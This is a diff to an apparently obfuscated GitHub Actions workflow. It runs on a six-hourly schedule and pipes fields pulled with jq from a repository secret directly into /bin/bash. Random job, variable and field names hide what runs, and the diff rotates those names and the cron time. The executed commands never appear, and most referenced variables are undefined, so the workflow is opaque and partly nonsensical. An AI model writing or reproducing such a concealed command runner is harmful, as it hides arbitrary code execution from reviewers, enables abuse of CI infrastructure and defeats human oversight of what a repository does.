@@ -1,10 +1,10 @@
 name: tchuanj
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
-jobs:  # 22501
+    - cron: '28 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,13 @@ jobs:  # 22501
       - uses: actions/checkout@v4
       - name: tchuanj
         env:
-          f5: ${{ secrets.f5 }}
+          upfta86977: ${{ secrets.upfta86977 }}
         run: |
-          echo $f5 | jq -r .cswwv04 | /bin/bash
-          echo $slem2955 | jq -r .cicz27483 | /bin/bash
-          echo $yw730 | jq -r .ddc9 | /bin/bash
-          echo $xyckm2 | jq -r .d76255 | /bin/bash
-          echo $ik1 | jq -r .ga34671 | /bin/bash
-          echo $r1 | jq -r .yftl00435 | /bin/bash
-          echo $sz703 | jq -r .z3091 | /bin/bash
-          echo $rgo722 | jq -r .azcal28845 | /bin/bash
-          echo $cac46013 | jq -r .fowv57417 | /bin/bash
-          echo $lewd502 | jq -r .bq4 | /bin/bash
+          echo $upfta86977 | jq -r .fy00 | /bin/bash
+          echo $u18683 | jq -r .mzmun01 | /bin/bash
+          echo $weskj7 | jq -r .g5016 | /bin/bash
+          echo $q4190 | jq -r .i2 | /bin/bash
+          echo $ffdi93086 | jq -r .bl579 | /bin/bash
+          echo $x9780 | jq -r .bszc58129 | /bin/bash
+          echo $cab29889 | jq -r .pim63 | /bin/bash
 
